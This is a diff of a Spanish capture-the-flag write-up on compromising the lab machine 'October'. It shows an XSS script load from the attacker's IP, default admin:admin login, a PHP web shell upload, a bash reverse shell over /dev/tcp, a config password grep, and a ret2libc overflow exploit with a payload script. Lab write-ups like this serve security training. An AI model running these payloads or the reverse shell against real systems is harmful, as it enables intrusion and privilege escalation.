@@ -1,4 +1,5 @@
 # 10.10.10.16 - October
+![October](https://user-images.githubusercontent.com/96772264/205711527-23a17d1c-77f1-4db6-bff7-ff50d021fce3.png)
 -----------------------
 
 Puertos abiertos: 22(ssh), 80(http)
@@ -6,7 +7,6 @@ Puertos abiertos: 22(ssh), 80(http)
 └─$ whatweb http://10.10.10.16
 [200 OK] Apache[2.4.7], Cookies[october_session],HttpOnly[october_session], Meta-Author[October CMS], PHP[5.5.9-1]
 ```
-
 Tenemos una web, que nos piden registrarnos. Una vez hecho esto nos dan dos cookies.
 ```
 october_session:eyJpdiI6ImVCXC9LbE4wYVBlNU5vV1ZIaW1neDFRPT0iLCJ2YWx1ZSI6InVDWGRUdmk4QjFjRWNjMVFRaFwvWjg0M2M5Y3czMWQ4U0k1V3AxbzFaYklFSDd5TU5nZ3IzT04wcVRHWWViS2xRXC8rcUhNb2x4Q0NNbEVXZlJMNVEzOHc9PSIsIm1hYyI6IjZmZjU1ZDRlNGE4YTQwYzdhMDQ0M2VjNzZjZDM0ODMxOTUwNzNmMzA3NDY2YzMwYzA1MTM1MDk5ODQ2NWJhZjcifQ%3D%3D
@@ -14,12 +14,13 @@ user_auth:eyJpdiI6IkhIQm8xaVc0TWNMTzR4WW1tQnlHZVE9PSIsInZhbHVlIjoiZlNnYTdUa20yM2
 
 {"iv":"eB\/KlN0aPe5NoWVHimgx1Q==","value":"uCXdTvi8B1cEcc1QQh\/Z843c9cw31d8SI5Wp1o1ZbIEH7yMNggr3ON0qTGYebKlQ\/+qHMolxCCMlEWfRL5Q38w==","mac":"6ff55d4e4a8a40c7a0443ec76cd3483195073f307466c30c051350998465baf7"}
 ```
+![october1](https://user-images.githubusercontent.com/96772264/205711573-3fb469c3-64ff-479d-b67b-a6e89e48d69c.PNG)
 
-La seccion de blog nos dice de poner "Una entrada mas interesante". Nos dan el link a /storage/app/media/dr.php5 
-También pone abajo un panel para comentar donde nos dejan poner markdown.
+La seccion de blog nos dice de poner "Una entrada mas interesante". Nos dan el link a /storage/app/media/dr.php5  También pone abajo un panel para comentar donde 
+nos dejan poner markdown.
 
-Ponemos : ```<script src="http://10.10.14.16/pwn.js"></script>``` pero no recibimos petición. El output se ve
-reflejado pero al poner ```{{7*7}}``` no sale 49
+Ponemos : ```<script src="http://10.10.14.16/pwn.js"></script>``` pero no recibimos petición. El output se ve reflejado pero al poner ```{{7*7}}``` no sale 49
+![october2](https://user-images.githubusercontent.com/96772264/205711604-ce104899-c133-4751-9e18-9ee52e4285eb.PNG)
 
 HAciendo fuzzing encontre la ruta "backend" (100 hilos en vez de 200 por que da cierto error)
 ```console
@@ -31,27 +32,24 @@ HAciendo fuzzing encontre la ruta "backend" (100 hilos en vez de 200 por que da 
 000000761:   302        11 L     22 W       400 Ch      "backend"
 ```
 
-En backend nos piden creds, le pongo los mios y no me dejan, busco los creds por defecto de "october cms" que son
-admin:admin y entro con ellos.
+En backend nos piden creds, le pongo los mios y no me dejan, busco los creds por defecto de "october cms" que son ```admin:admin``` y entro con ellos.
+![october3](https://user-images.githubusercontent.com/96772264/205711651-95cd03a5-d03e-42b0-bab5-853172de5a6f.PNG)
+![october4](https://user-images.githubusercontent.com/96772264/205711664-e362a539-9321-46aa-a88b-2671ff678a17.PNG)
+
 ```<php shell_exec($_GET['cmd']); ?>```
-En searchsploit si pones "october cms" te salen varias cosas, entre ellas uno de file upload. October cms no
-deja subir .php pero si .php5
+En searchsploit si pones "october cms" te salen varias cosas, entre ellas uno de file upload. October cms no deja subir .php pero si .php5
 ```php
 <?php 
     system($_GET['cmd']);
 ?>
 ```
-Luego de poner en la ruta que nos dan ```bash -c 'bash -i >& /dev/tcp/10.10.14.16/443 0>&1'```
-recibimos una consola al escuchar con netcat ```sudo nc -nlvp 443```
-
-Entramos con la carpeta "/var/www/html/cms/storage/app/" Dos directorios mas atrás hay uno de config, esta bien
-mirar ahí en busca de credenciales
-```
+Luego de poner en la ruta que nos dan ```bash -c 'bash -i >& /dev/tcp/10.10.14.16/443 0>&1'``` recibimos una consola al escuchar con netcat ```sudo nc -nlvp 443```
+Entramos con la carpeta "/var/www/html/cms/storage/app/" Dos directorios mas atrás hay uno de config, esta bien mirar ahí en busca de credenciales
+```console
 www-data@october:/var/www/html/cms/config$ grep -rIE "password"
 database.php:            'password'  => 'OctoberCMSPassword!!',
 ```
-Pero no nos sirve ni para migrar al usaurio harry ni para conectarnos a la base de datos local.
-Enumerando mas encontramos un binario SUID "/usr/local/bin/ovrflw"
+Pero no nos sirve ni para migrar al usaurio harry ni para conectarnos a la base de datos local. Enumerando mas encontramos un binario SUID "/usr/local/bin/ovrflw"
 ```console
 └─$ sudo nc -nlvp 666 > ovrflw
 www-data@october:/tmp$ cat "/usr/local/bin/ovrflw" | nc 10.10.14.16 666
@@ -75,9 +73,7 @@ A partir de 112 de input, se desborda el buffer.
 gef➤ r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
 $eip   : 0x42424242 ("BBBB"?)
 ```
-
 Ya tenemos control del eip, pero en vez de redirigirlo a un sitio inutil mejor a una carga de código.
-
 ```console
 www-data@october:/$ for i in $(seq 1 100); do ldd /usr/local/bin/ovrflw | grep libc | awk 'NF{print $NF}'; done
 (0xb7636000)
@@ -88,7 +84,6 @@ www-data@october:/$ for i in $(seq 1 100); do ldd /usr/local/bin/ovrflw | grep l
 (0xb760f000)
 ```
 El ASLR cambia cada dos por tres así que hay que coger una random como "0xb7548000"
-
 ```console
 www-data@october:/$ ldd /usr/local/bin/ovrflw
 	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75cc000)
@@ -108,7 +103,6 @@ exit = struct.pack("<L", libc + 0x00033260)
 sh = struct.pack("<L", libc + 0x00162bac)
 print(junk + system + exit + sh)
 ```
-
 ```console
 www-data@october:/tmp$ while true; do /usr/local/bin/ovrflw $(cat /tmp/payload); done
 Segmentation fault (core dumped)
